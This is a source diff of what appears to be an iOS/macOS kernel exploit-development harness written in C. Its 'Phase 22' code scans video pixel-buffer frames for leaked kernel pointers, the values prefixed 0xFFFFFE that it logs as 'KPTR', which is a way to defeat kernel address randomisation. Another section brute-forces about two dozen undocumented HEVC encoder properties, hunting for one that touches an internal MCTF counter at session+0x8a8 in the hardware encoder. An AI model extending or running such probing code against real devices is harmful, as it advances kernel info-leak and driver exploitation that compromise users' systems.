@@ -70,7 +70,7 @@ extern kern_return_t mach_make_memory_entry_64(
 #include <arpa/inet.h>
 #include <signal.h>
 #include <setjmp.h>
-#import <objc/message.h>
+/* objc/message.h not needed — pure C */
 
 extern int csops(pid_t pid, unsigned int ops, void *useraddr, size_t usersize);
 extern int proc_pidinfo(int pid, int flavor, uint64_t arg, void *buffer, int buffersize);
@@ -24072,15 +24072,25 @@ new_modes:
 
                     /* Create pixel buffer */
                     CVPixelBufferRef pxbuf = NULL;
-                    NSDictionary *pbattrs = @{
-                        (id)kCVPixelBufferIOSurfacePropertiesKey: @{}
-                    };
+                    CFMutableDictionaryRef pbattrs = CFDictionaryCreateMutable(
+                        kCFAllocatorDefault, 0,
+                        &kCFTypeDictionaryKeyCallBacks,
+                        &kCFTypeDictionaryValueCallBacks);
+                    CFDictionaryRef iosurface_props = CFDictionaryCreateMutable(
+                        kCFAllocatorDefault, 0,
+                        &kCFTypeDictionaryKeyCallBacks,
+                        &kCFTypeDictionaryValueCallBacks);
+                    CFDictionarySetValue(pbattrs,
+                        kCVPixelBufferIOSurfacePropertiesKey,
+                        iosurface_props);
+                    CFRelease(iosurface_props);
                     CVReturn cvr = CVPixelBufferCreate(
                         kCFAllocatorDefault,
                         1920, 1080,
                         kCVPixelFormatType_32BGRA,
-                        (__bridge CFDictionaryRef)pbattrs,
+                        pbattrs,
                         &pxbuf);
+                    CFRelease(pbattrs);
                     rlog("  PixelBuffer create: %d\n", (int)cvr);
 
                     if (cvr == 0 && pxbuf) {
@@ -24129,20 +24139,18 @@ new_modes:
                                                     if ((v >> 40) == 0xFFFFFE) {
                                                         kptr_count++;
                                                         if (kptr_count <= 3) {
-                                                            /* Use NSLog to also
-                                                               hit os_log */
-                                                            NSLog(@"P22 KPTR "
-                                                                  @"frame %d "
-                                                                  @"off %zu: "
-                                                                  @"0x%llx",
+                                                            rlog("  ** P22 KPTR "
+                                                                 "frame %d "
+                                                                 "off %zu: "
+                                                                 "0x%llx\n",
                                                                 fi, qi * 8,
                                                                 (unsigned long long)v);
                                                         }
                                                     }
                                                 }
                                                 if (kptr_count > 0) {
-                                                    NSLog(@"P22 KPTR total: %d "
-                                                          @"in frame %d",
+                                                    rlog("  ** P22 KPTR total: %d "
+                                                         "in frame %d\n",
                                                         kptr_count, fi);
                                                 }
                                             }
@@ -24277,53 +24285,90 @@ new_modes:
                 }
             }
 
-            /* ---- 22d: VTFrameProcessor temporal noise filter ---- */
-            rlog("\n--- 22d: VTFrameProcessor temporal noise filter ---\n");
+            /* ---- 22d: Additional HEVC property brute-force ---- */
+            rlog("\n--- 22d: HEVC undocumented property brute-force ---\n");
             {
-                /* The VTFrameProcessor API (iOS 26+) has a temporal noise
-                 * filter that may internally use the MCTF code path */
-                rlog("  VTFrameProcessor requires iOS 26+ ObjC runtime\n");
-                rlog("  Attempting dynamic class lookup...\n");
+                /* Try additional undocumented property names that may map
+                 * to the MCTF counter at session+0x8a8 */
+                VTCompressionSessionRef bf_enc = NULL;
+                CFMutableDictionaryRef bf_spec = CFDictionaryCreateMutable(
+                    kCFAllocatorDefault, 0,
+                    &kCFTypeDictionaryKeyCallBacks,
+                    &kCFTypeDictionaryValueCallBacks);
+                CFDictionarySetValue(bf_spec,
+                    CFSTR("EnableHardwareAcceleratedVideoEncoder"),
+                    kCFBooleanTrue);
 
-                Class vttnfConfig = NSClassFromString(
-                    @"VTTemporalNoiseFilterConfiguration");
-                rlog("  VTTemporalNoiseFilterConfiguration: %p\n",
-                    vttnfConfig);
+                OSStatus bfst = VTCompressionSessionCreate(
+                    kCFAllocatorDefault, 1920, 1080,
+                    kCMVideoCodecType_HEVC,
+                    bf_spec, NULL, NULL, NULL, NULL, &bf_enc);
 
-                if (vttnfConfig) {
-                    /* Get previousFrameCount / nextFrameCount */
-                    id config = [[vttnfConfig alloc] init];
-                    if (config) {
-                        SEL prevSel = NSSelectorFromString(
-                            @"previousFrameCount");
-                        SEL nextSel = NSSelectorFromString(
-                            @"nextFrameCount");
-                        if ([config respondsToSelector:prevSel]) {
-                            NSInteger prev = ((NSInteger(*)(id,SEL))
-                                objc_msgSend)(config, prevSel);
-                            rlog("  previousFrameCount: %ld\n", (long)prev);
-                        }
-                        if ([config respondsToSelector:nextSel]) {
-                            NSInteger next = ((NSInteger(*)(id,SEL))
-                                objc_msgSend)(config, nextSel);
-                            rlog("  nextFrameCount: %ld\n", (long)next);
-                        }
+                if (bfst == 0 && bf_enc) {
+                    const char *extra_props[] = {
+                        "TemporalNoiseFilter",
+                        "EnableTemporalNoiseFilter",
+                        "TemporalNoiseFilterLevel",
+                        "TemporalNoiseFilterCount",
+                        "MCTFCount",
+                        "MCTFLevel",
+                        "MCTFMode",
+                        "EnableMCTFFilter",
+                        "ReferenceFrameCount",
+                        "NumReferenceFrames",
+                        "MultiPassMCTF",
+                        "TemporalFilterLevel",
+                        "TemporalFilterCount",
+                        "TemporalFilterMode",
+                        "NoiseReductionLevel",
+                        "NoiseReductionCount",
+                        "AVEMCTFStrength",
+                        "AVEMCTFEnable",
+                        "AVETemporalFilter",
+                        "HWMCTFEnable",
+                        "HWMCTFStrength",
+                        "HWTemporalFilter",
+                        "FrameProcessorTemporalFilter",
+                        "PreviousFrameCount",
+                        "NextFrameCount",
+                        NULL
+                    };
 
-                        /* Check if we can create a VTFrameProcessor */
-                        Class vtfp = NSClassFromString(@"VTFrameProcessor");
-                        rlog("  VTFrameProcessor: %p\n", vtfp);
-                        if (vtfp) {
-                            SEL initSel = NSSelectorFromString(
-                                @"initWithConfiguration:");
-                            if ([vtfp instancesRespondToSelector:initSel]) {
-                                id proc = [[vtfp alloc]
-                                    performSelector:initSel
-                                    withObject:config];
-                                rlog("  Processor created: %p\n", proc);
+                    for (int pi = 0; extra_props[pi]; pi++) {
+                        CFStringRef key = CFStringCreateWithCString(
+                            kCFAllocatorDefault, extra_props[pi],
+                            kCFStringEncodingUTF8);
+                        int val = 5;
+                        CFNumberRef num = CFNumberCreate(
+                            kCFAllocatorDefault, kCFNumberIntType, &val);
+                        OSStatus sst = VTSessionSetProperty(bf_enc, key, num);
+                        if (sst == 0) {
+                            rlog("  ** ACCEPTED: %s=5 (st=0)\n",
+                                extra_props[pi]);
+                            /* Read it back */
+                            CFTypeRef rb = NULL;
+                            OSStatus rst = VTSessionCopyProperty(
+                                bf_enc, key, kCFAllocatorDefault, &rb);
+                            if (rst == 0 && rb) {
+                                if (CFGetTypeID(rb) == CFNumberGetTypeID()) {
+                                    int rv = 0;
+                                    CFNumberGetValue(rb, kCFNumberIntType, &rv);
+                                    rlog("  ** Readback: %s=%d\n",
+                                        extra_props[pi], rv);
+                                }
+                                CFRelease(rb);
                             }
+                        } else if (sst != -12900 && sst != -12902) {
+                            rlog("  %s: st=%d\n", extra_props[pi], (int)sst);
                         }
+                        CFRelease(num);
+                        CFRelease(key);
                     }
+
+                    VTCompressionSessionInvalidate(bf_enc);
+                    CFRelease(bf_enc);
                 }
+                if (bf_spec) CFRelease(bf_spec);
             }
 
             rlog("\n=== Phase 22 Summary ===\n");
